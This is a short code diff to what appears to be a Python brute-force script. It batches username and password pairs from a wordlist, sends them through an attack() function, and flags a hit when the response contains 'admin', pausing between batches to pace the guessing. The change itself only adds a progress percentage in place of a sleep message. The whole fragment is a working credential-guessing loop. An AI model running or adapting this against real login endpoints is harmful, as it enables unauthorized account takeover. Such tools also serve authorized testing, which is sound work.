@@ -131,12 +131,13 @@ if __name__ == "__main__":
 	entries = []
 	for user in users:
 		print("user: %s" % user)
-		for num in range(0, len(passwds)):
+		passwds_len = len(passwds)
+		for num in range(0, passwds_len):
 			if (len(entries) == PASSWD_PER_REQUEST):
 				if "admin" in attack(entries):
 					find_one(entries)
 				entries = []
-				print("Going to sleep for a while...")
+				print("Progress: %d / %d (%.3f %%)" % (num, passwds_len, (num / passwds_len) * 100))
 				time.sleep(WAIT_TIME)
 			entries.append({"user": user, "passwd": passwds[num]})
 		if "admin" in attack(entries):
